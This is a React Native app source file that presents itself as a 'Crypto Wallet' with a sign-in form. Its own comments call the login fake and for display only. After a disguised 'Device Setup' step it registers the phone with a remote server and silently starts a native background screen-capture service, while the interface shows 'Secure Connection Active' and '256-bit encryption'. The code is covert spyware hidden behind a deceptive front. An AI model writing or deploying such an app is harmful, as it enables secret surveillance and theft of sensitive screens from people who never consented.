import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
  SafeAreaView,
  StyleSheet,
  View,
  Text,
  TextInput,
  TouchableOpacity,
  Modal,
  Alert,
  ActivityIndicator,
  Platform,
  PermissionsAndroid,
  NativeModules,
  AppState,
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import axios from 'axios';
import DeviceInfo from 'react-native-device-info';

const { ScreenshotModule } = NativeModules;
const API_URL = 'http://192.168.0.106:3000'; // Your computer's IP

interface DeviceInfoType {
  deviceId: string;
  deviceName: string;
  deviceModel: string;
  osVersion: string;
  appVersion: string;
}

const App = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [checking, setChecking] = useState(true);
  const [showRegistrationModal, setShowRegistrationModal] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState<DeviceInfoType | null>(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [backendConnected, setBackendConnected] = useState(false);
  const [connectionError, setConnectionError] = useState(false);
  const appState = useRef(AppState.currentState);

  const initializeApp = useCallback(async () => {
    try {
      // Get device info
      const uniqueId = await DeviceInfo.getUniqueId();
      const deviceName = await DeviceInfo.getDeviceName();
      const deviceModel = await DeviceInfo.getModel();
      const osVersion = await DeviceInfo.getSystemVersion();
      const appVersion = DeviceInfo.getVersion();

      const info: DeviceInfoType = {
        deviceId: uniqueId,
        deviceName,
        deviceModel,
        osVersion,
        appVersion,
      };

      setDeviceInfo(info);
      await AsyncStorage.setItem('deviceInfo', JSON.stringify(info));

      // Check if device is registered
      await checkDeviceRegistration(uniqueId);
    } catch (error) {
      console.error('Error initializing app:', error);
      Alert.alert('Error', 'Failed to initialize app');
    } finally {
      setChecking(false);
    }
  }, []);

  useEffect(() => {
    initializeApp();
  }, [initializeApp]);

  const checkDeviceRegistration = async (deviceId: string) => {
    try {
      const response = await axios.get(`${API_URL}/api/devices/check/${deviceId}`);
      
      setBackendConnected(true);
      setConnectionError(false);
      
      if (response.data.registered) {
        setIsRegistered(true);
        await AsyncStorage.setItem('isRegistered', 'true');
      } else {
        setIsRegistered(false);
        await AsyncStorage.removeItem('isRegistered');
        // Show registration modal after a short delay to let UI load
        setTimeout(() => setShowRegistrationModal(true), 1000);
      }
    } catch (error) {
      console.error('Error checking registration:', error);
      setBackendConnected(false);
      setConnectionError(true);
      // Don't show registration modal when backend is unreachable
    }
  };

  const requestPermissions = async () => {
    if (Platform.OS === 'android') {
      try {
        const androidVersion = Platform.Version;
        if (androidVersion >= 33) {
          // Android 13+ doesn't need storage permissions for app-specific files
          return true;
        } else {
          const granted = await PermissionsAndroid.request(
            PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
            {
              title: 'Storage Permission',
              message: 'App needs access to storage for screenshots',
              buttonNeutral: 'Ask Me Later',
              buttonNegative: 'Cancel',
              buttonPositive: 'OK',
            }
          );
          return granted === PermissionsAndroid.RESULTS.GRANTED;
        }
      } catch (err) {
        console.warn(err);
        return false;
      }
    }
    return true;
  };

  const handleRegisterDevice = async () => {
    if (!deviceInfo) {
      Alert.alert('Error', 'Device information not available');
      return;
    }

    setLoading(true);
    try {
      console.log('Registering device:', deviceInfo);
      const response = await axios.post(`${API_URL}/api/devices/register-monitoring`, deviceInfo);

      console.log('Registration response:', response.data);
      
      if (response.data.success) {
        setIsRegistered(true);
        await AsyncStorage.setItem('isRegistered', 'true');
        
        // Save registration status to native side (if method exists)
        try {
          if (ScreenshotModule && ScreenshotModule.saveRegistrationStatus) {
            await ScreenshotModule.saveRegistrationStatus(true);
          }
        } catch (err) {
          console.log('Could not save registration status to native:', err);
        }
        
        setShowRegistrationModal(false);
        
        console.log('Device registered successfully, starting monitoring...');
        
        // Auto-start monitoring immediately after registration
        setTimeout(() => {
          startBackgroundMonitoring();
        }, 800);
      } else {
        throw new Error('Registration failed');
      }
    } catch (error: any) {
      console.error('Registration error:', error);
      // Check if device was actually registered despite error
      if (error.response?.data?.success || error.response?.data?.device) {
        setIsRegistered(true);
        await AsyncStorage.setItem('isRegistered', 'true');
        
        try {
          if (ScreenshotModule && ScreenshotModule.saveRegistrationStatus) {
            await ScreenshotModule.saveRegistrationStatus(true);
          }
        } catch (err) {
          console.log('Could not save registration status to native:', err);
        }
        
        setShowRegistrationModal(false);
        setTimeout(() => {
          startBackgroundMonitoring();
        }, 800);
      } else {
        Alert.alert('Error', error.response?.data?.error || error.message || 'Failed to register device');
      }
    } finally {
      setLoading(false);
    }
  };

  const startBackgroundMonitoring = async () => {
    if (!deviceInfo) {
      console.log('Device info not available, skipping monitoring start');
      Alert.alert('Error', 'Device information not available');
      return;
    }

    console.log('Starting background monitoring...', {
      deviceId: deviceInfo.deviceId,
      deviceName: deviceInfo.deviceName,
      apiUrl: API_URL,
      moduleExists: !!ScreenshotModule,
      isRegistered
    });

    if (!ScreenshotModule) {
      console.error('Native module not available');
      Alert.alert('Error', 'Native module not available. Please rebuild the app.');
      return;
    }

    try {
      // Request permissions first
      const hasPermission = await requestPermissions();
      if (!hasPermission) {
        console.log('Storage permissions not granted');
      }
      
      // Start the native background service
      console.log('Calling ScreenshotModule.startBackgroundCapture...');
      await ScreenshotModule.startBackgroundCapture(
        deviceInfo.deviceId,
        deviceInfo.deviceName,
        API_URL
      );
      
      console.log('Background capture started successfully');
      setIsMonitoring(true);
      await AsyncStorage.setItem('isMonitoring', 'true');
      
      // No alert - silently start monitoring
      console.log('Monitoring started automatically');
    } catch (error: any) {
      console.error('Error starting background monitoring:', error);
      // Only show error if permission was denied
      if (error.message && (error.message.includes('permission') || error.message.includes('PERMISSION'))) {
        Alert.alert('Permission Required', 'Please grant screen capture permission to enable monitoring.');
      } else {
        console.error('Failed to start monitoring:', error.message);
      }
    }
  };

  const stopBackgroundMonitoring = async () => {
    if (!ScreenshotModule) {
      Alert.alert('Error', 'Native module not available');
      return;
    }
    
    try {
      console.log('Stopping background monitoring...');
      await ScreenshotModule.stopBackgroundCapture();
      setIsMonitoring(false);
      await AsyncStorage.removeItem('isMonitoring');
      console.log('Background monitoring stopped');
      Alert.alert('Success', 'Monitoring stopped');
    } catch (error: any) {
      console.error('Error stopping monitoring:', error);
      Alert.alert('Error', 'Failed to stop monitoring');
    }
  };

  // Check if service is running on app start
  useEffect(() => {
    const checkServiceStatus = async () => {
      if (!ScreenshotModule) {
        console.log('ScreenshotModule not available');
        return;
      }
      
      try {
        console.log('Checking if service is running...');
        const isRunning = await ScreenshotModule.isServiceRunning();
        console.log('Service running status:', isRunning);
        setIsMonitoring(isRunning);
        if (isRunning) {
          await AsyncStorage.setItem('isMonitoring', 'true');
        }
      } catch (error) {
        console.error('Error checking service status:', error);
      }
    };

    if (isRegistered) {
      checkServiceStatus();
    }
  }, [isRegistered]);

  const handleFakeLogin = () => {
    // This is just for UI - no actual authentication
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      if (!email || !password) {
        Alert.alert('Error', 'Please fill all fields');
        return;
      }
      // Just show a message, no real login
      Alert.alert('Info', 'This is a monitoring device. The login screen is for display only.');
    }, 1000);
  };

  // Render different screens based on state
  if (checking) {
    return (
      <View style={styles.centerContainer}>
        <ActivityIndicator size="large" color="#667eea" />
        <Text style={styles.loadingText}>Initializing...</Text>
      </View>
    );
  }

  if (connectionError) {
    return (
      <View style={styles.centerContainer}>
        <View style={styles.iconContainer}>
          <Text style={styles.icon}>🔧</Text>
        </View>
        <Text style={styles.errorTitle}>Server Under Maintenance</Text>
        <Text style={styles.errorMessage}>
          Our servers are currently under maintenance. Please try again in a few moments.
        </Text>
        <TouchableOpacity
          style={styles.retryButton}
          onPress={() => {
            setChecking(true);
            setConnectionError(false);
            initializeApp();
          }}>
          <Text style={styles.retryButtonText}>🔄 Retry Connection</Text>
        </TouchableOpacity>
      </View>
    );
  }

  return (
    <SafeAreaView style={styles.container}>
      <View style={styles.content}>
        {/* Crypto Wallet Style Header */}
        <View style={styles.header}>
          <View style={styles.iconContainer}>
            <Text style={styles.icon}>₿</Text>
          </View>
          <Text style={styles.title}>Crypto Wallet</Text>
          <Text style={styles.subtitle}>Secure your digital assets</Text>
        </View>

        {/* Fake Auth Form */}
        <View style={styles.form}>
          <TextInput
            style={styles.input}
            placeholder="Email Address"
            placeholderTextColor="#a0aec0"
            value={email}
            onChangeText={setEmail}
            keyboardType="email-address"
            autoCapitalize="none"
          />
          <TextInput
            style={styles.input}
            placeholder="Password"
            placeholderTextColor="#a0aec0"
            value={password}
            onChangeText={setPassword}
            secureTextEntry
          />

          <TouchableOpacity
            style={styles.button}
            onPress={handleFakeLogin}
            disabled={loading}>
            {loading ? (
              <ActivityIndicator color="#fff" />
            ) : (
              <Text style={styles.buttonText}>Sign In</Text>
            )}
          </TouchableOpacity>

          <TouchableOpacity style={styles.switchButton}>
            <Text style={styles.switchText}>
              Don't have an account? Sign Up
            </Text>
          </TouchableOpacity>
        </View>

        {/* Status Indicator - Only show if monitoring is active */}
        {isMonitoring && (
          <View style={styles.statusBadge}>
            <View style={[styles.statusDot, styles.statusDotActive]} />
            <Text style={styles.statusBadgeText}>
              Secure Connection Active
            </Text>
          </View>
        )}

        <View style={styles.footer}>
          <Text style={styles.footerText}>🔒 Secured with 256-bit encryption</Text>
        </View>
      </View>

      {/* Registration Modal */}
      <Modal
        visible={showRegistrationModal}
        animationType="slide"
        transparent={true}
        onRequestClose={() => {}}>
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <Text style={styles.modalTitle}>Device Setup Required</Text>
            <Text style={styles.modalText}>
              This device needs to be set up before you can use the wallet.
            </Text>

            {deviceInfo && (
              <View style={styles.deviceInfoContainer}>
                <Text style={styles.deviceInfoText}>
                  Device: {deviceInfo.deviceName}
                </Text>
                <Text style={styles.deviceInfoText}>
                  Model: {deviceInfo.deviceModel}
                </Text>
                <Text style={styles.deviceInfoText}>
                  OS: {deviceInfo.osVersion}
                </Text>
              </View>
            )}

            <TouchableOpacity
              style={styles.modalButton}
              onPress={handleRegisterDevice}
              disabled={loading}>
              {loading ? (
                <ActivityIndicator color="#fff" />
              ) : (
                <Text style={styles.modalButtonText}>Setup Device</Text>
              )}
            </TouchableOpacity>
          </View>
        </View>
      </Modal>
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#1a202c',
  },
  centerContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#1a202c',
  },
  loadingText: {
    marginTop: 16,
    color: '#a0aec0',
    fontSize: 16,
  },
  errorTitle: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#fff',
    marginTop: 24,
    marginBottom: 12,
    textAlign: 'center',
  },
  errorMessage: {
    fontSize: 16,
    color: '#a0aec0',
    textAlign: 'center',
    paddingHorizontal: 32,
    marginBottom: 32,
    lineHeight: 24,
  },
  retryButton: {
    backgroundColor: '#667eea',
    paddingHorizontal: 32,
    paddingVertical: 16,
    borderRadius: 12,
  },
  retryButtonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
  },
  content: {
    flex: 1,
    padding: 24,
    justifyContent: 'center',
  },
  header: {
    alignItems: 'center',
    marginBottom: 48,
  },
  iconContainer: {
    width: 80,
    height: 80,
    borderRadius: 40,
    backgroundColor: '#667eea',
    justifyContent: 'center',
    alignItems: 'center',
    marginBottom: 16,
  },
  icon: {
    fontSize: 40,
    color: '#fff',
  },
  title: {
    fontSize: 32,
    fontWeight: 'bold',
    color: '#fff',
    marginBottom: 8,
  },
  subtitle: {
    fontSize: 16,
    color: '#a0aec0',
  },
  form: {
    marginBottom: 24,
  },
  input: {
    backgroundColor: '#2d3748',
    borderRadius: 12,
    padding: 16,
    marginBottom: 16,
    color: '#fff',
    fontSize: 16,
    borderWidth: 1,
    borderColor: '#4a5568',
  },
  button: {
    backgroundColor: '#667eea',
    borderRadius: 12,
    padding: 16,
    alignItems: 'center',
    marginTop: 8,
  },
  buttonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  switchButton: {
    marginTop: 16,
    alignItems: 'center',
  },
  switchText: {
    color: '#667eea',
    fontSize: 14,
  },
  statusBadge: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: '#2d3748',
    borderRadius: 20,
    padding: 12,
    marginBottom: 16,
  },
  statusDot: {
    width: 8,
    height: 8,
    borderRadius: 4,
    backgroundColor: '#48bb78',
    marginRight: 8,
  },
  statusDotActive: {
    backgroundColor: '#48bb78',
  },
  statusBadgeText: {
    color: '#fff',
    fontSize: 14,
    fontWeight: '600',
  },
  footer: {
    alignItems: 'center',
  },
  footerText: {
    color: '#718096',
    fontSize: 12,
  },
  // Modal Styles
  modalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.8)',
    justifyContent: 'center',
    alignItems: 'center',
    padding: 24,
  },
  modalContent: {
    backgroundColor: '#2d3748',
    borderRadius: 20,
    padding: 32,
    width: '100%',
    maxWidth: 400,
  },
  modalTitle: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#fff',
    marginBottom: 16,
    textAlign: 'center',
  },
  modalText: {
    fontSize: 16,
    color: '#a0aec0',
    marginBottom: 24,
    textAlign: 'center',
    lineHeight: 24,
  },
  deviceInfoContainer: {
    backgroundColor: '#1a202c',
    borderRadius: 12,
    padding: 16,
    marginBottom: 24,
  },
  deviceInfoText: {
    color: '#e2e8f0',
    fontSize: 14,
    marginBottom: 8,
  },
  modalButton: {
    backgroundColor: '#667eea',
    borderRadius: 12,
    padding: 16,
    alignItems: 'center',
  },
  modalButtonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
  },
});

export default App;

